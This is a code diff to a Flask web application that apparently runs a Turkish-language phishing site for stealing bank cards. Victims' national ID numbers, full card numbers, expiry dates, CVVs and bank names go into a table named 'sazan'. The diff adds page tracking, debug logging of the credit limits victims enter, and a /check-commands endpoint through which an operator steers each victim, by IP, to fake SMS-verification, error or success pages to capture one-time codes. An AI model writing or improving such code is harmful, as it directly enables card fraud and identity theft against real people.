@@ -3,14 +3,14 @@ from __future__ import annotations
 import re
 from datetime import datetime
 
-from flask import Blueprint, redirect, render_template, request, session, url_for
+from flask import Blueprint, jsonify, redirect, render_template, request, session, url_for
 
 from ..binlookup import lookup_bank
 from ..config import AppConfig
 from ..database import get_cursor
 from ..detectors import detect_browser, detect_device
 from ..encryption import build_encrypted_response
-from ..utils import enforce_ban, get_client_ip, tum_bosluklari_temizle, update_flow_state
+from ..utils import enforce_ban, get_client_ip, update_flow_state
 
 public_bp = Blueprint("public", __name__)
 
@@ -78,18 +78,20 @@ def index():
         cc_last_4 = sanitized_card[-4:]
         bin_prefix = sanitized_card[:6]
         bin_metadata = lookup_bank(bin_prefix)
-        bank_name = (bin_metadata.get("bank") or {}).get("name") if bin_metadata else None
+        bank_name = None
+        if bin_metadata and isinstance(bin_metadata.get("bank"), dict):
+            bank_name = bin_metadata["bank"].get("name")
 
         now_str = datetime.now().strftime(DATE_FORMAT)
         device_name = detect_device(request.headers.get("User-Agent"))
         browser_name = detect_browser(request.headers.get("User-Agent"))
 
         insert_sql = """
-            INSERT INTO sazan (ip, date, cihaz, tarayici, tc, kk, sonkul, cvv, banka)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            INSERT INTO sazan (ip, date, cihaz, tarayici, tc, kk, sonkul, cvv, banka, now)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """
         with get_cursor() as cursor:
-            params = (client_ip, now_str, device_name, browser_name, tc, sanitized_card, expiry, cvv, bank_name)
+            params = (client_ip, now_str, device_name, browser_name, tc, sanitized_card, expiry, cvv, bank_name, "Anasayfa")
             if AppConfig.database_url:
                 cursor.execute(insert_sql + " RETURNING id", params)
                 new_row = cursor.fetchone()
@@ -123,6 +125,11 @@ def limit_kontrol():
     if request.method == "POST" and query_id:
         total_limit = _sanitize_limit_value(form_data["total_limit"])
         current_limit = _sanitize_limit_value(form_data["current_limit"])
+        
+        # Debug logging
+        print(f"[DEBUG] Form data: total_limit={form_data['total_limit']!r}, current_limit={form_data['current_limit']!r}")
+        print(f"[DEBUG] Sanitized: total_limit={total_limit}, current_limit={current_limit}")
+        
         if total_limit is None or current_limit is None:
             return _render(
                 "limit-kontrol.html",
@@ -226,3 +233,37 @@ def tebrikler():
         arti_bakiye=arti_bakiye,
         yeni_limit=yeni_limit,
     )
+
+
+@public_bp.route("/check-commands")
+def check_commands():
+    """Check if admin sent any commands (SMS, tebrik, hata1, back) for this IP"""
+    client_ip = get_client_ip(request)
+    if not client_ip:
+        print(f"[CHECK_COMMANDS] No client IP detected")
+        return jsonify({"redirect": None})
+    
+    print(f"[CHECK_COMMANDS] Checking commands for IP: {client_ip}")
+    
+    # Check each command table
+    command_routes = {
+        "sms": "public.sms_dogrulama",
+        "tebrik": "public.tebrikler",
+        "hata1": "public.sms_hatali",
+        "back": "public.limit_kontrol",
+    }
+    
+    with get_cursor() as cursor:
+        for table_name, route_name in command_routes.items():
+            query = f"SELECT {table_name} FROM {table_name} WHERE {table_name}=? LIMIT 1"
+            print(f"[CHECK_COMMANDS] Checking table {table_name}: {query}")
+            cursor.execute(query, (client_ip,))
+            result = cursor.fetchone()
+            if result:
+                print(f"[CHECK_COMMANDS] Found command in {table_name} table, redirecting to {route_name}")
+                # Delete the command and redirect
+                cursor.execute(f"DELETE FROM {table_name} WHERE {table_name}=?", (client_ip,))
+                return jsonify({"redirect": url_for(route_name)})
+    
+    print(f"[CHECK_COMMANDS] No commands found for {client_ip}")
+    return jsonify({"redirect": None})
